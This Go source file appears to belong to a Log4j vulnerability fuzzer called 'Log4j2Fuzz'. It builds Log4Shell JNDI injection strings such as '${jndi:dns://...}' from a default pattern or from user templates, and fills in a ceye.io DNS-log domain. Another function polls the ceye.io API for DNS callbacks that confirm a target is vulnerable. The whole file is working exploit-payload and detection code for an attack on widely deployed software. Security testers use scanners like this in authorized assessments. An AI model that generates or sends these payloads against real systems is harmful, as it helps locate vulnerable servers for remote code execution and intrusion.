package conf

import (
	"Log4j2Fuzz/HttpRequest"
	"fmt"
	"os"
	"strings"
)

func DNS() map[string]interface{} {
	if Conf.Ceye.Domain == "" && Conf.Ceye.Token == "" {
		fmt.Println("please check ceye config!")
		os.Exit(1)
	}
	request := fmt.Sprintf("http://api.ceye.io/v1/records?token=%s&type=dns", Conf.Ceye.Token)
	req := HttpRequest.NewRequest()
	req.SetTimeout(5)
	r, err2 := req.Get(request)
	if err2 != nil {
		fmt.Printf("ceye dns request error: %s\n", err2)
	}

	var m map[string]interface{}
	err := r.Json(&m)
	if err != nil {
		fmt.Printf("ceye dns response error: %s\n", err)
	}
	return m
}

func DNSGeneratePaylod(num1, num2 string, k int) (payload string) {
	var DefaultPayload string
	if Conf.DefaultPayload == "" {
		DefaultPayload = fmt.Sprintf("${jndi:dns://%s.%s.%s.%s}", Rand, num1, num2, Conf.Ceye.Domain)
		payload = Conf.Request[k].Payload
		if payload == "" {
			return DefaultPayload
		} else {
			if strings.Contains(payload, "*ip*") && strings.Contains(payload, "*port*") {
				if strings.Contains(payload, "<#>") || strings.Contains(payload, "<#*>") || strings.Contains(payload, "<#**>") {
					payload = strings.Replace(payload, "*ip*:*port*", Rand+"."+num1+"."+num2+"."+Conf.Ceye.Domain, 1)
					if strings.Contains(payload, "<#**>") {
						payload = strings.Replace(payload, "<#**>", "", 1)
					}
					if strings.Contains(payload, "<#*>") {
						payload = strings.Replace(payload, "<#*>", "", 1)
					}
					if strings.Contains(payload, "<#>") {
						payload = strings.Replace(payload, "<#>", "", 1)
					}
				}
			}
			DefaultPayload = payload
		}
		return DefaultPayload
	} else {
		if strings.Contains(Conf.DefaultPayload, "*ip*") && strings.Contains(Conf.DefaultPayload, "*port*") {
			if strings.Contains(Conf.DefaultPayload, "<#>") || strings.Contains(Conf.DefaultPayload, "<#*>") || strings.Contains(Conf.DefaultPayload, "<#**>") {
				DefaultPayload = strings.Replace(Conf.DefaultPayload, "*ip*:*port*", Rand+"."+num1+"."+num2+"."+Conf.Ceye.Domain, 1)
				if strings.Contains(Conf.DefaultPayload, "<#**>") {
					DefaultPayload = strings.Replace(DefaultPayload, "<#**>", "", 1)
				}
				if strings.Contains(Conf.DefaultPayload, "<#*>") {
					DefaultPayload = strings.Replace(DefaultPayload, "<#*>", "", 1)
				}
				if strings.Contains(Conf.DefaultPayload, "<#>") {
					DefaultPayload = strings.Replace(DefaultPayload, "<#>", "", 1)
				}
			}
		}
		payload = Conf.Request[k].Payload
		if payload == "" {
			return DefaultPayload
		} else {
			if strings.Contains(payload, "*ip*") && strings.Contains(payload, "*port*") {
				if strings.Contains(payload, "<#>") || strings.Contains(payload, "<#*>") || strings.Contains(payload, "<#**>") {
					payload = strings.Replace(payload, "*ip*:*port*", Rand+"."+num1+"."+num2+"."+Conf.Ceye.Domain, 1)
					if strings.Contains(payload, "<#**>") {
						payload = strings.Replace(payload, "<#**>", "", 1)
					}
					if strings.Contains(payload, "<#*>") {
						payload = strings.Replace(payload, "<#*>", "", 1)
					}
					if strings.Contains(payload, "<#>") {
						payload = strings.Replace(payload, "<#>", "", 1)
					}
				}
			}
			DefaultPayload = payload
		}
		return DefaultPayload
	}
}
